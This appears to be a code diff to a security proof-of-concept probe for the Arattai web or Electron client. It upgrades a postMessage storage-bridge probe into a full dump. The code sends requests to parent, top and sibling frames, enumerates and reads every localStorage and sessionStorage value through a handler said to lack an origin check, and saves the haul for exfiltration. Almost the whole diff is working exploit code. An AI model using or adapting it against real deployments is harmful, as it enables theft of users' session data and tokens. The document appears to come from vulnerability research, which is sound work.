@@ -175,101 +175,209 @@
         });
     }
 
-    // 9. postMessage storage bridge (Web client only — W2)
+    // 9. postMessage storage bridge — FULL DUMP (Web client / Electron — W2)
+    // db-handler.js (no origin check) dispatches localStorage/sessionStorage[methodName](key,value).
+    // Phase 1: enumerate all key names via key(0)..key(49) on both stores.
+    // Phase 2: read every value with getItem(key).
+    // Full dump → window.__bridgeDump → exfiltrated to collector.
     function probePostMessageBridge() {
         return probe("postMessage Storage Bridge (Web client — W2)", function() {
-            // This probe targets the db-handler.js storage iframe in the Arattai web shell.
-            // db-handler.js listens for { type: 'LocalStorageRequest', params, requestId }
-            // and responds with event.source.postMessage({ type: 'LocalStorageResponse', result }, event.origin).
-            // It fires meaningful results when the mini-app runs inside the Arattai web app as a sibling iframe.
             var referrer = document.referrer || "";
             var isInsideArattaiWeb = (
                 window.parent !== window &&
-                (
-                    referrer.indexOf("arattai") >= 0 ||
-                    client.id === "browser" ||
-                    client.id === "electron"
-                )
+                (referrer.indexOf("arattai") >= 0 || client.id === "browser" || client.id === "electron")
             );
             if (!isInsideArattaiWeb) {
-                na("not inside Arattai web shell — skipping postMessage bridge probe");
+                na("not inside Arattai web shell — postMessage bridge probe skipped");
             }
 
             return new Promise(function(resolve, reject) {
-                var results = {};
                 var done = false;
-                var requestId = "poc-" + Date.now();
+                var bridgeAlive = false;
 
-                function sendRequest(target) {
+                // Phase 1 tracking: key(index) requests
+                var lsKeyReqs  = {};   // rid -> true (ls key enum)
+                var ssKeyReqs  = {};   // rid -> true (ss key enum)
+                var lsKeyDone  = {};   // dedup
+                var ssKeyDone  = {};
+
+                // Phase 2 tracking: getItem(key) requests
+                var lsGetReqs  = {};   // rid -> key
+                var ssGetReqs  = {};   // rid -> key
+                var lsGetDone  = {};
+                var ssGetDone  = {};
+
+                var pending    = 0;    // outstanding requests not yet processed
+                var lsDump     = {};
+                var ssDump     = {};
+
+                // ── helpers ──────────────────────────────────────────────────────
+                function blast(msgType, methodName, args, rid) {
+                    var msg = {
+                        type: msgType,
+                        params: { methodName: methodName, arguments: args },
+                        requestId: rid
+                    };
+                    function trySend(w) {
+                        try { if (w && w !== window) w.postMessage(msg, "*"); } catch(e) {}
+                    }
+                    trySend(window.parent);
+                    trySend(window.top);
                     try {
-                        target.postMessage({
-                            type: "LocalStorageRequest",
-                            params: { methodName: "getItem", arguments: "zcq_user_info" },
-                            requestId: requestId
-                        }, "*");
-                    } catch(e2) { /* cross-origin — postMessage itself is allowed; ignore other errors */ }
-                }
-
-                function finish() {
-                    if (done) return;
-                    done = true;
-                    window.removeEventListener("message", handler);
-                    if (Object.keys(results).length > 0) {
-                        resolve("STORAGE BRIDGE VULN — " + Object.keys(results)[0] +
-                                " received from origin: " + results.__origin +
-                                " · value: " + String(results[Object.keys(results)[0]]).slice(0, 200));
-                    } else {
-                        var e = new Error();
-                        e.__probeResult = { status: "SAFE", detail: "no response from storage bridge within 10 s timeout" };
-                        reject(e);
-                    }
-                }
-
-                var timer = setTimeout(finish, 10000);
-
-                function handler(event) {
-                    var type = event.data && event.data.type;
-                    if (type === "LocalStorageResponse" || type === "SessionStorageResponse" || type === "IDBResponse") {
-                        if (!done) {
-                            results[type] = event.data.result !== undefined ? event.data.result : event.data.error;
-                            results.__origin = event.origin;
-                            clearTimeout(timer);
-                            finish();
+                        if (window.parent && window.parent !== window && window.parent.frames) {
+                            for (var fi = 0; fi < window.parent.frames.length; fi++) trySend(window.parent.frames[fi]);
                         }
+                    } catch(e) {}
+                    try {
+                        if (window.top && window.top !== window.parent && window.top.frames) {
+                            for (var ti = 0; ti < window.top.frames.length; ti++) trySend(window.top.frames[ti]);
+                        }
+                    } catch(e) {}
+                }
+
+                function maybeDone() {
+                    if (done || pending > 0) return;
+                    done = true;
+                    clearTimeout(mainTimer);
+                    window.removeEventListener("message", bridgeHandler);
+                    emitResult();
+                }
+
+                function emitResult() {
+                    var lsKeys = Object.keys(lsDump);
+                    var ssKeys = Object.keys(ssDump);
+                    var total  = lsKeys.length + ssKeys.length;
+
+                    if (total === 0) {
+                        var e = new Error();
+                        e.__probeResult = {
+                            status: "SAFE",
+                            detail: bridgeAlive
+                                ? "bridge responded — localStorage and sessionStorage are empty"
+                                : "no response from storage bridge within 10 s"
+                        };
+                        reject(e);
+                        return;
                     }
-                    // If the storage iframe announces itself AFTER our probe fires, immediately send the request
-                    if (type === "arattai_iframe_loaded" && !done) {
-                        sendRequest(event.source);
+
+                    window.__bridgeDump = { localStorage: lsDump, sessionStorage: ssDump };
+
+                    var lines = ["FULL STORAGE DUMP — " + lsKeys.length + " localStorage + " +
+                                 ssKeys.length + " sessionStorage keys exfiltrated",
+                                 "localStorage:"];
+                    lsKeys.forEach(function(k) {
+                        lines.push("  " + k + " = " + String(lsDump[k]).slice(0, 160));
+                    });
+                    if (ssKeys.length) {
+                        lines.push("sessionStorage:");
+                        ssKeys.forEach(function(k) {
+                            lines.push("  " + k + " = " + String(ssDump[k]).slice(0, 160));
+                        });
+                    }
+                    resolve(lines.join("\n"));
+                }
+
+                // ── response handler ─────────────────────────────────────────────
+                function bridgeHandler(event) {
+                    var d = event.data;
+                    if (!d || !d.requestId) return;
+                    var rid = d.requestId;
+
+                    // Late-loading storage iframe announces itself → re-blast phase-1
+                    if (d.type === "arattai_iframe_loaded" && !done) {
+                        var MAX_IDX = 50;
+                        for (var ri = 0; ri < MAX_IDX; ri++) {
+                            var rkl = "lsk_" + ri, rks = "ssk_" + ri;
+                            if (!lsKeyDone[rkl]) blast("LocalStorageRequest",  "key", ri, rkl);
+                            if (!ssKeyDone[rks]) blast("SessionStorageRequest", "key", ri, rks);
+                        }
+                        return;
+                    }
+
+                    // ── localStorage key() ──────────────────────────────────────
+                    if (d.type === "LocalStorageResponse" && lsKeyReqs[rid] && !lsKeyDone[rid]) {
+                        lsKeyDone[rid] = true;
+                        bridgeAlive = true;
+                        pending--;
+                        var lsKey = d.result;
+                        if (lsKey !== null && lsKey !== undefined && !d.error) {
+                            var lgid = "lsv_" + lsKey;
+                            if (!lsGetReqs[lgid] && !lsGetDone[lgid]) {
+                                lsGetReqs[lgid] = lsKey;
+                                pending++;
+                                blast("LocalStorageRequest", "getItem", lsKey, lgid);
+                            }
+                        }
+                        maybeDone();
+                        return;
+                    }
+
+                    // ── localStorage getItem() ───────────────────────────────────
+                    if (d.type === "LocalStorageResponse" && lsGetReqs[rid] && !lsGetDone[rid]) {
+                        lsGetDone[rid] = true;
+                        pending--;
+                        lsDump[lsGetReqs[rid]] = d.result;
+                        maybeDone();
+                        return;
+                    }
+
+                    // ── sessionStorage key() ─────────────────────────────────────
+                    if (d.type === "SessionStorageResponse" && ssKeyReqs[rid] && !ssKeyDone[rid]) {
+                        ssKeyDone[rid] = true;
+                        bridgeAlive = true;
+                        pending--;
+                        var ssKey = d.result;
+                        if (ssKey !== null && ssKey !== undefined && !d.error) {
+                            var sgid = "ssv_" + ssKey;
+                            if (!ssGetReqs[sgid] && !ssGetDone[sgid]) {
+                                ssGetReqs[sgid] = ssKey;
+                                pending++;
+                                blast("SessionStorageRequest", "getItem", ssKey, sgid);
+                            }
+                        }
+                        maybeDone();
+                        return;
+                    }
+
+                    // ── sessionStorage getItem() ─────────────────────────────────
+                    if (d.type === "SessionStorageResponse" && ssGetReqs[rid] && !ssGetDone[rid]) {
+                        ssGetDone[rid] = true;
+                        pending--;
+                        ssDump[ssGetReqs[rid]] = d.result;
+                        maybeDone();
+                        return;
                     }
                 }
 
-                window.addEventListener("message", handler);
+                window.addEventListener("message", bridgeHandler);
 
-                // Blast to parent and all sibling frames (db-handler.js runs in a child iframe of the shell)
-                if (window.parent !== window) {
-                    sendRequest(window.parent);
+                // ── Phase 1: enumerate keys 0-49 for both stores ──────────────
+                var MAX_IDX = 50;
+                for (var i = 0; i < MAX_IDX; i++) {
+                    var lsKid = "lsk_" + i, ssKid = "ssk_" + i;
+                    lsKeyReqs[lsKid] = true;
+                    ssKeyReqs[ssKid] = true;
+                    pending += 2;
+                    blast("LocalStorageRequest",  "key", i, lsKid);
+                    blast("SessionStorageRequest", "key", i, ssKid);
                 }
-                if (window.parent && window.parent.frames) {
-                    for (var i = 0; i < window.parent.frames.length; i++) {
-                        sendRequest(window.parent.frames[i]);
-                    }
-                }
-                // Also try top-level frames (handles nested iframe scenarios)
-                if (window.top && window.top !== window.parent && window.top.frames) {
-                    for (var j = 0; j < window.top.frames.length; j++) {
-                        sendRequest(window.top.frames[j]);
-                    }
-                }
-                // Retry after 2 s in case storage iframe loads lazily
+
+                // Retry phase 1 at 2 s in case db-handler iframe loads lazily
                 setTimeout(function() {
                     if (done) return;
-                    if (window.parent !== window) sendRequest(window.parent);
-                    if (window.parent && window.parent.frames) {
-                        for (var k = 0; k < window.parent.frames.length; k++) {
-                            sendRequest(window.parent.frames[k]);
-                        }
+                    for (var ri = 0; ri < MAX_IDX; ri++) {
+                        var rkl = "lsk_" + ri, rks = "ssk_" + ri;
+                        if (!lsKeyDone[rkl]) blast("LocalStorageRequest",  "key", ri, rkl);
+                        if (!ssKeyDone[rks]) blast("SessionStorageRequest", "key", ri, rks);
                     }
                 }, 2000);
+
+                var mainTimer = setTimeout(function() {
+                    if (done) return;
+                    done = true;
+                    window.removeEventListener("message", bridgeHandler);
+                    emitResult();
+                }, 10000);
             });
         });
     }
